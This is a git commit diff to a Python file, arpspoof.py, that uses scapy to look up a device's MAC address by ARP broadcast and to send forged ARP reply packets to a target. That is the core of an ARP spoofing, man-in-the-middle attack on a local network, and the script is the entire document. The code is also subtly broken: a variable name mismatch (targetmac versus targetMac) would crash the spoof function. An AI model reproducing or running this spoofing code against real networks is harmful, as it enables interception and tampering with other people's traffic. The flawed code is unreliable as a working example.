1ca91cac049709ce41cbc345f1d57b9f4c4e257f
root <anup.vaze@valueleaf.com>
2021-06-13 10:36:42 +0530

    Create functions to get macaddress of the target device and send the ARP response packet

--- arpspoof.py
+++ arpspoof.py
@@ -1,6 +1,27 @@
 import scapy.all as scapy 
 
-#Create ARP response packet
-packet = scapy.ARP(op=2,pdst="192.168.31.19", hwdst="b4:c4:fc:ac:df:e0", psrc="192.118.31.1")
+#Function to get Macaddress of a device which is at a particualr IP
+def getMac(ip):
+    #Create an ARP packet giving it {YOUR-IP} as source
+    arp = scapy.ARP(pdst=ip)
+    #Create an Ether packect giving it dummy macaddress as source
+    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
+    #Create an coupled packet with ARP and Ether
+    request = broadcast/arp
+    #Submit an coupled packet and receive responses
+    #Fetch only answered
+    #Make the srp function non-verbose
+    answered = scapy.srp(request, timeout=1, verbose=False)[0]
+    #Return only the macaddress
+    return answered[0][1].hwsrc
+    
+#Function to send arp spoof packets
+def spoof(targetip,sourceip):
+    #Get macaddress of terget device
+    targetmac = getMac(targetip)
+    #Create ARP response packet
+    packet = scapy.ARP(op=2,pdst=targetip, hwdst=targetMac, psrc=sourceip)
+    #Send ARP response packet
+    scapy.send(packet)
 
-
+getMac("192.168.31.19")
